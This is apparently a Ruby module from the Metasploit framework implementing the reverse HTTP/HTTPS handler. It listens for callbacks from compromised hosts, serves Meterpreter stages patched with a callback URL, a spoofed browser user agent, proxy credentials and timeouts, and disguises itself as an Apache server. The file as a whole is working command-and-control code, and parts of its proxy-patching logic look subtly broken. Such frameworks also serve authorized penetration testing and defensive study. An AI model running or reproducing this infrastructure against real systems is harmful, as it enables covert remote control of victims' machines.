# -*- coding: binary -*-
require 'rex/io/stream_abstraction'
require 'rex/sync/ref'
require 'msf/core/handler/reverse_http/uri_checksum'
require 'rex/payloads/meterpreter/patch'

module Msf
module Handler

###
#
# This handler implements the HTTP SSL tunneling interface.
#
###
module ReverseHttp

  include Msf::Handler
  include Msf::Handler::ReverseHttp::UriChecksum

  #
  # Returns the string representation of the handler type
  #
  def self.handler_type
    return "reverse_http"
  end

  #
  # Returns the connection-described general handler type, in this case
  # 'tunnel'.
  #
  def self.general_handler_type
    "tunnel"
  end

  #
  # Initializes the HTTP SSL tunneling handler.
  #
  def initialize(info = {})
    super

    register_options(
      [
        OptString.new('LHOST', [ true, "The local listener hostname" ]),
        OptPort.new('LPORT', [ true, "The local listener port", 8080 ])
      ], Msf::Handler::ReverseHttp)

    register_advanced_options(
      [
        OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
        OptInt.new('SessionExpirationTimeout', [ false, 'The number of seconds before this session should be forcibly shut down', (24*3600*7)]),
        OptInt.new('SessionCommunicationTimeout', [ false, 'The number of seconds of no activity before this session should be killed', 300]),
        OptString.new('MeterpreterUserAgent', [ false, 'The user-agent that the payload should use for communication', 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' ]),
        OptString.new('MeterpreterServerName', [ false, 'The server header that the handler will send in response to requests', 'Apache' ]),
        OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
        OptInt.new('ReverseListenerBindPort', [ false, 'The port to bind to on the local system if different from LPORT' ]),
        OptBool.new('OverrideRequestHost', [ false, 'Forces clients to connect to LHOST:LPORT instead of keeping original payload host', false ]),
        OptString.new('HttpUnknownRequestResponse', [ false, 'The returned HTML response body when the handler receives a request that is not from a payload', '<html><body><h1>It works!</h1></body></html>'  ])
      ], Msf::Handler::ReverseHttp)
  end

  # Determine where to bind the server
  #
  # @return [String]
  def listener_address
    if datastore['ReverseListenerBindAddress'].to_s == ""
      bindaddr = Rex::Socket.is_ipv6?(datastore['LHOST']) ? '::' : '0.0.0.0'
    else
      bindaddr = datastore['ReverseListenerBindAddress']
    end

    bindaddr
  end

  # Return a URI suitable for placing in a payload
  #
  # @return [String] A URI of the form +scheme://host:port/+
  def listener_uri
    uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
  end

  # Return a URI suitable for placing in a payload.
  #
  # Host will be properly wrapped in square brackets, +[]+, for ipv6
  # addresses.
  #
  # @return [String] A URI of the form +scheme://host:port/+
  def payload_uri(req)
    if req and req.headers and req.headers['Host'] and not datastore['OverrideRequestHost']
      uri_host = req.headers['Host']
    elsif Rex::Socket.is_ipv6?(datastore['LHOST'])
      uri_host = "[#{datastore['LHOST']}]:#{datastore['LPORT']}"
    else
      uri_host = "#{datastore['LHOST']}:#{datastore['LPORT']}"
    end
    "#{scheme}://#{uri_host}/"
  end

  # Use the {#refname} to determine whether this handler uses SSL or not
  #
  def ssl?
    !!(self.refname.index("https"))
  end

  # URI scheme
  #
  # @return [String] One of "http" or "https" depending on whether we
  #   are using SSL
  def scheme
    (ssl?) ? "https" : "http"
  end

  # Create an HTTP listener
  #
  def setup_handler

    comm = datastore['ReverseListenerComm']
    if (comm.to_s == "local")
      comm = ::Rex::Socket::Comm::Local
    else
      comm = nil
    end

    local_port = bind_port


    # Start the HTTPS server service on this host/port
    self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
      local_port,
      listener_address,
      ssl?,
      {
        'Msf'        => framework,
        'MsfExploit' => self,
      },
      comm,
      (ssl?) ? datastore["HandlerSSLCert"] : nil
    )

    self.service.server_name = datastore['MeterpreterServerName']

    # Create a reference to ourselves
    obj = self

    # Add the new resource
    service.add_resource("/",
      'Proc' => Proc.new { |cli, req|
        on_request(cli, req, obj)
      },
      'VirtualDirectory' => true)

    print_status("Started #{scheme.upcase} reverse handler on #{listener_uri}")
    lookup_proxy_settings
  end

  #
  # Removes the / handler, possibly stopping the service if no sessions are
  # active on sub-urls.
  #
  def stop_handler
    if self.service
      self.service.remove_resource("/")
      Rex::ServiceManager.stop_service(self.service) if self.pending_connections == 0
    end
  end

  attr_accessor :service # :nodoc:

protected

  #
  # Parses the proxy settings and returns a hash
  #
  def lookup_proxy_settings
    info = {}
    return @proxy_settings if @proxy_settings

    if datastore['PROXY_HOST'].to_s == ""
      @proxy_settings = info
      return @proxy_settings
    end

    info[:host] = datastore['PROXY_HOST'].to_s
    info[:port] = (datastore['PROXY_PORT'] || 8080).to_i
    info[:type] = datastore['PROXY_TYPE'].to_s

    uri_host = info[:host]

    if Rex::Socket.is_ipv6?(uri_host)
      uri_host = "[#{info[:host]}]"
    end

    info[:info] = "#{uri_host}:#{info[:port]}"

    if info[:type] == "SOCKS"
      info[:info] = "socks=#{info[:info]}"
    else
      info[:info] = "http://#{info[:info]}"
      if datastore['PROXY_USERNAME'].to_s != ""
        info[:username] = datastore['PROXY_USERNAME'].to_s
      end
      if datastore['PROXY_PASSWORD'].to_s != ""
        info[:password] = datastore['PROXY_PASSWORD'].to_s
      end
    end

    @proxy_settings = info
  end

  #
  # Parses the HTTPS request
  #
  def on_request(cli, req, obj)
    resp = Rex::Proto::Http::Response.new

    print_status("#{cli.peerhost}:#{cli.peerport} Request received for #{req.relative_resource}...")

    uri_match = process_uri_resource(req.relative_resource)

    # Process the requested resource.
    case uri_match
      when /^\/INITPY/
        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
        url = payload_uri(req) + conn_id + '/'

        blob = ""
        blob << obj.generate_stage

        var_escape = lambda { |txt|
          txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
        }

        # Patch all the things
        blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
        blob.sub!('HTTP_EXPIRATION_TIMEOUT = 604800', "HTTP_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
        blob.sub!('HTTP_COMMUNICATION_TIMEOUT = 300', "HTTP_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
        blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")

        if @proxy_settings[:host]
          blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(@proxy_settings[:info])}'")
        end

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?,
        })
        self.pending_connections += 1

      when /^\/INITJM/
        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
        url = payload_uri(req) + conn_id + "/\x00"

        blob = ""
        blob << obj.generate_stage

        # This is a TLV packet - I guess somewhere there should be an API for building them
        # in Metasploit :-)
        packet = ""
        packet << ["core_switch_url\x00".length + 8, 0x10001].pack('NN') + "core_switch_url\x00"
        packet << [url.length+8, 0x1000a].pack('NN')+url
        packet << [12, 0x2000b, datastore['SessionExpirationTimeout'].to_i].pack('NNN')
        packet << [12, 0x20019, datastore['SessionCommunicationTimeout'].to_i].pack('NNN')
        blob << [packet.length+8, 0].pack('NN') + packet

        resp.body = blob

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?
        })

      when /^\/A?INITM?/
        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
        url = payload_uri(req) + conn_id + "/\x00"

        print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
        resp['Content-Type'] = 'application/octet-stream'

        blob = obj.stage_payload

        # Replace the user agent string with our option
        i = blob.index("METERPRETER_UA\x00")
        if i
          str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
          blob[i, str.length] = str
          print_status("Patched user-agent at offset #{i}...")
        end

        # Activate a custom proxy
        if blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00") && @proxy_settings[:info]
          proxy_info = @proxy_settings[:info] + "\x00"

          blob[i, proxy_info.length] = proxy_info
          print_status("Activated custom proxy #{proxyinfo}, patch at offset #{i}...")

          # Optional authentication
          if @proxy_settings[:username] && @proxy_settings[:password]
            proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
            proxy_username = @proxy_settings[:username] + "\x00"
            blob[proxy_username_loc, proxy_username.length] = proxy_username

            proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
            proxy_password = @proxy_settings[:password] + "\x00"
            blob[proxy_password_loc, proxy_password.length] = proxy_password
          end
        end

        # Replace the transport string first (TRANSPORT_SOCKET_SSL)
        i = blob.index("METERPRETER_TRANSPORT_SSL")
        if i
          str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
          blob[i, str.length] = str
        end
        print_status("Patched transport at offset #{i}...")

        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
        i = blob.index("https://" + ("X" * 256))
        if i
          url = payload_uri + conn_id + "/\x00"
          blob[i, url.length] = url
        end
        print_status("Patched URL at offset #{i}...")

        i = blob.index([0xb64be661].pack("V"))
        if i
          str = [ datastore['SessionExpirationTimeout'] ].pack("V")
          blob[i, str.length] = str
        end
        print_status("Patched Expiration Timeout at offset #{i}...")

        i = blob.index([0xaf79257f].pack("V"))
        if i
          str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
          blob[i, str.length] = str
        end
        print_status("Patched Communication Timeout at offset #{i}...")

        resp.body = encode_stage(blob)

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => url,
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?,
        })

      when /^\/CONN_.*\//
        resp.body = ""
        # Grab the checksummed version of CONN from the payload's request.
        conn_id = req.relative_resource.gsub("/", "")

        print_status("Incoming orphaned session #{conn_id}, reattaching...")

        # Short-circuit the payload's handle_connection processing for create_session
        create_session(cli, {
          :passive_dispatcher => obj.service,
          :conn_id            => conn_id,
          :url                => payload_uri(req) + conn_id + "/\x00",
          :expiration         => datastore['SessionExpirationTimeout'].to_i,
          :comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
          :ssl                => ssl?,
        })

      else
        print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
        resp.code    = 200
        resp.message = "OK"
        resp.body    = datastore['HttpUnknownRequestResponse'].to_s
    end

    cli.send_response(resp) if (resp)

    # Force this socket to be closed
    obj.service.close_client( cli )
  end

protected

  def bind_port
    port = datastore['ReverseListenerBindPort'].to_i
    port > 0 ? port : datastore['LPORT'].to_i
  end

end

end
end

